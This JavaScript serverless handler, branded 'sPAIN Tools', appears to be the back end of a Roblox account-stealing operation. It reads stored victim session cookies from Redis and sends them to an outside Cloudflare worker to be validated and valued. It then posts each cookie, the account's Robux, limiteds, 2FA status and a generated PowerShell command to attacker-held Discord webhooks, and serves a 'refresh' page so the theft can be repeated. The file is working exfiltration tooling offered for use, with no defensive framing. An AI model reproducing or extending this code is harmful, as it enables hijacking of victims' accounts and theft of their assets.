// api/refresh.js
// GET  /r/:id → serve the HTML page
// POST /api/refresh with { id } → regenerate info + PS, send rich embed to Discord
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    return r || null;
  } catch { return null; }
}

async function getWorkerData(cookie) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text, lang = '') {
  const wrap  = lang ? `\`\`\`${lang}\n` : '';
  const end   = lang ? '\n```' : '';
  const limit = 1990 - wrap.length - end.length;
  let rem = text, first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
    await discordSend(url, { content: (first ? wrap : '') + chunk + (rem.length === 0 ? end : '') });
    first = false;
  }
}

async function sendRefreshEmbed(webhookUrl, { roblox, cookie, powershell, pageName, refreshUrl }) {
  const now = new Date().toISOString();
  await discordSend(webhookUrl, {
    embeds: [{
      title:       `🔄 Refreshed — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)\n[🔄 Refresh Again](${refreshUrl})`,
      color:       0x06b6d4,
      thumbnail:   { url: roblox.avatarUrl },
      fields: [
        { name: '🔴 Robux',    value: `${roblox.robux?.toLocaleString() || 0}`,                                              inline: true  },
        { name: '🎵 RAP',      value: `${roblox.limitedsValue?.toLocaleString() || 0}\n(${roblox.limitedsCount || 0} items)`, inline: true  },
        { name: '🗓️ Age',      value: `${roblox.accountAgeDays} days`,                                                       inline: true  },
        { name: '💎 Premium',  value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                 inline: true  },
        { name: '👥 Groups',   value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,     inline: true  },
        { name: '⚙️ Account',  value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                    inline: false },
        { name: '🎯 Gamepasses', value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        { name: '📋 PowerShell', value: '```\n' + (powershell || '').substring(0, 1000) + '\n```', inline: false }
      ],
      footer:    { text: `sPAIN Refresh • ${pageName} • ${now}` },
      timestamp: now
    }]
  });

  if (powershell && powershell.length > 1000) {
    await discordChunked(webhookUrl, powershell, 'powershell');
  }
  await discordChunked(webhookUrl, cookie);
}

function buildPage(id) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>sPAIN Tools — Refresh</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
  :root{--bg:#03070f;--card:#060d1a;--accent:#00c8ff;--accent2:#0051ff;--text:#e8f4ff;--muted:#3a5a7a;--border:rgba(0,200,255,0.1)}
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:var(--bg);color:var(--text);font-family:'Space Mono',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,200,255,0.012) 2px,rgba(0,200,255,0.012) 4px);pointer-events:none}
  .card{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:44px 48px;width:100%;max-width:500px;position:relative;box-shadow:0 0 80px rgba(0,200,255,0.08)}
  .card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent2),var(--accent))}
  .badge{display:inline-flex;align-items:center;gap:7px;background:rgba(0,200,255,0.08);border:1px solid rgba(0,200,255,0.2);border-radius:3px;padding:4px 12px;font-size:0.62rem;font-weight:700;letter-spacing:0.18em;text-transform:uppercase;color:var(--accent);margin-bottom:20px}
  h1{font-family:'Syne',sans-serif;font-size:1.9rem;font-weight:800;letter-spacing:-0.03em;margin-bottom:10px}
  h1 span{color:var(--accent)}
  .desc{font-size:0.8rem;color:var(--muted);line-height:1.7;margin-bottom:32px}
  .btn{width:100%;background:var(--accent);color:#03070f;border:none;padding:16px 0;border-radius:3px;font-family:'Syne',sans-serif;font-size:1rem;font-weight:800;letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;box-shadow:0 0 30px rgba(0,200,255,0.4);transition:transform .15s,box-shadow .15s}
  .btn:hover{transform:translateY(-2px);box-shadow:0 0 50px rgba(0,200,255,0.65)}
  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
  .status{margin-top:14px;font-size:0.68rem;letter-spacing:0.08em;min-height:18px;text-align:center}
  .note{margin-top:12px;font-size:0.62rem;color:var(--muted);text-align:center;letter-spacing:0.06em}
</style>
</head>
<body>
<div class="card">
  <div class="badge">🔄 Refresh Session</div>
  <h1>s<span>PAIN</span> Tools</h1>
  <div class="desc">Click the button to fetch the latest account info and send a fresh PowerShell command to your Discord webhook.</div>
  <button class="btn" id="btn" onclick="go()">Get Fresh Info + PowerShell</button>
  <div class="status" id="status"></div>
  <div class="note">Sends full account info + command to Discord automatically</div>
</div>
<script>
const ID = '${id}';
async function go() {
  const btn = document.getElementById('btn');
  const st  = document.getElementById('status');
  btn.disabled = true; btn.textContent = 'Working...'; st.style.color='#3a5a7a'; st.textContent='Fetching account info...';
  try {
    const r = await fetch('/api/refresh', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ id: ID })
    });
    const d = await r.json();
    if (d.success) {
      btn.textContent='✅ Sent to Discord!'; btn.style.background='#22c55e'; btn.style.boxShadow='0 0 30px rgba(34,197,94,0.5)';
      st.style.color='#22c55e'; st.textContent='✅ Full info + PowerShell sent. Check your webhook.';
      setTimeout(()=>{ btn.disabled=false; btn.textContent='Refresh Again'; btn.style.background=''; btn.style.boxShadow=''; }, 4000);
    } else {
      btn.textContent='❌ Failed'; btn.style.background='#ff3a5c';
      st.style.color='#ff3a5c'; st.textContent=d.error||'Cookie may be expired.';
      setTimeout(()=>{ btn.disabled=false; btn.textContent='Try Again'; btn.style.background=''; }, 3000);
    }
  } catch {
    btn.disabled=false; btn.textContent='Network Error — Try Again';
    st.style.color='#ff3a5c'; st.textContent='Check your connection.';
  }
}
</script>
</body>
</html>`;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // Extract ID from URL or body
  const urlParts  = (req.url || '').split('?')[0].replace(/^\/r\//, '').replace(/^\/api\/refresh/, '').replace(/^\//, '');
  const queryId   = new URLSearchParams((req.url || '').split('?')[1] || '').get('id');
  const routeId   = urlParts || queryId || '';

  // GET — serve the HTML page
  if (req.method === 'GET') {
    if (!routeId) { res.setHeader('Content-Type','text/html'); return res.status(400).send('<h1>Missing ID</h1>'); }
    const record = await redisGet(`refresh:${routeId}`);
    if (!record)  { res.setHeader('Content-Type','text/html'); return res.status(404).send('<h1>Not found</h1>'); }
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(buildPage(routeId));
  }

  // POST — regenerate and send to Discord
  if (req.method === 'POST') {
    let body = req.body;
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
    if (typeof body === 'object' && Buffer.isBuffer(body)) { try { body = JSON.parse(body.toString()); } catch { body = {}; } }
    const postId = body?.id || routeId;
    if (!postId) return res.status(400).json({ error: 'id required' });

    const record = await redisGet(`refresh:${postId}`);
    if (!record)          return res.status(404).json({ error: 'Refresh not found' });
    if (!record.cookie)   return res.status(500).json({ error: 'No cookie stored' });
    if (!record.webhook)  return res.status(500).json({ error: 'No webhook stored' });

    const workerData = await getWorkerData(record.cookie);
    if (!workerData?.valid) return res.status(502).json({ error: 'Worker failed — cookie may be expired' });

    const refreshUrl = `https://spain-tools.vercel.app/r/${postId}`;
    const payload    = {
      roblox:     workerData,
      cookie:     record.cookie,
      powershell: workerData.powershell,
      pageName:   record.pageName || 'unknown',
      refreshUrl
    };

    await Promise.all([
      sendRefreshEmbed(record.webhook, payload),
      record.webhook1 && record.webhook1 !== record.webhook
        ? sendRefreshEmbed(record.webhook1, payload)
        : Promise.resolve()
    ]);

    return res.status(200).json({ success: true });
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
